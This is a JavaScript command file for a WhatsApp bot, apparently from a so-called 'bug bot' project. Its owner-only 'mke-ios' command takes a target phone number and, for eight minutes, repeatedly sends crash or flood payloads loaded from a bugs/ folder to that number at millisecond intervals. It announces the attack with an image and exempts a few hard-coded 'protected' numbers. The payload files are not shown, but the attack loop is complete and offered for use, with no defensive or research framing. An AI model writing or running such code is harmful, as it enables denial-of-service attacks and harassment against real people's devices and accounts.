const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'mke-ios',
  desc: '🧨 Ultra-fast bug attack for 8 minutes with all payloads.',
  category: 'bug',
  react: '👺',
  filename: __filename
}, async (client, message, args, { reply, isOwner }) => {
  if (!isOwner) return reply("❌ This command is for the bot *owner only*.");

  try {
    const prefix = config.PREFIX;
    const body = message.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'mke-ios') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await reply(`❌ Usage:\n${prefix}mke-ios <number>`);
    }

    const protectedNumbers = ['50941350366', '50938091691', '13058962443'];
    if (protectedNumbers.includes(targetNumber)) {
      return await reply('🛡️ This number is protected. Attack canceled.');
    }

    const iosBugPath = path.join(__dirname, '../bugs/ios/ios.js');
    const iosComboBugPath = path.join(__dirname, '../bugs/ios-combo-bug/ios-combo-bug.js');

    if (!fs.existsSync(iosBugPath) || !fs.existsSync(iosComboBugPath)) {
      return await reply('📁 One or more payloads in /bugs not found.');
    }

    const iosBug = require(iosBugPath);
    const iosComboBug = require(iosComboBugPath);

    // Prepare bugs array - if ou vle tou itilize lòt bugs nan dosye bugs/
    // Sinon ou ka fè yon array ki gen sèlman iosBug ak iosComboBug si sa ou vle:
    const bugs = [iosBugPath, iosComboBugPath];
    const bugDir = path.join(__dirname, '../bugs');

    // Send image before attack
    const imagePath = path.join(__dirname, '../media/1.png');
    if (!fs.existsSync(imagePath)) {
      return await reply('📁 Attack image not found.');
    }
    const img = fs.readFileSync(imagePath);
    await client.sendMessage(message.from, {
      image: img,
      caption: `👺 *mke-ios* attack in progress:\n👤 wa.me/${targetNumber}\n⏱️ Duration: 8 minutes\n🚀 Speed: 3s\n📦 Payloads: ${bugs.length}`,
    }, { quoted: message });

    const end = Date.now() + 8 * 60 * 1000;

    while (Date.now() < end) {
      for (const bugPath of bugs) {
        try {
          let payload = require(bugPath);

          if (typeof payload === 'object' && typeof payload.default === 'string') {
            const msg = payload.default;
            payload = async (client, number) => {
              await client.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof payload === 'string') {
            const msg = payload;
            payload = async (client, number) => {
              await client.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof payload === 'function') {
            await payload(client, targetNumber);
          }

        } catch (e) {
          console.error(`❌ Error in ${bugPath}:`, e.message);
        }

        await new Promise(r => setTimeout(r, 3)); // 3ms delay between bugs
      }
    }

    await reply(`✅ *mke-ios* finished attacking +${targetNumber}`);

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});